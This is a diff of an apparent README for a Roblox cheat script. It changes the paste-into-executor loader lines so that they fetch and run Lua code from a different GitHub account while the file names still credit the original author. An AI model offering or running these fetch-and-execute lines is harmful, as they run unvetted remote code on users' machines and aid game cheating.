@@ -7,12 +7,12 @@ Copy and paste one of these into your Roblox executor:
 
 ### 🌟 Stable Release
  ```lua
-   loadstring(game:HttpGet("https://raw.githubusercontent.com/raygull3d/99-Nights-in-the-Forest-Script/refs/heads/main/99%20Days%20Scirpt%20By%20Raygull.lua"))()
+   loadstring(game:HttpGet("https://raw.githubusercontent.com/Script-lang/99NITF-script2026/refs/heads/main/99%20Days%20Scirpt%20By%20Raygull.lua"))()
 ``` 
 
 ### 🧪 Beta Version
  ```lua
-loadstring(game:HttpGet("https://raw.githubusercontent.com/raygull3d/99-Nights-in-the-Forest-Script/refs/heads/main/99%20Days%20Scirpt%20By%20Raygull%20Beta%201.0.lua"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Script-lang/99NITF-script2026/refs/heads/main/99%20Days%20Scirpt%20By%20Raygull.lua"))()
 ```
 
 
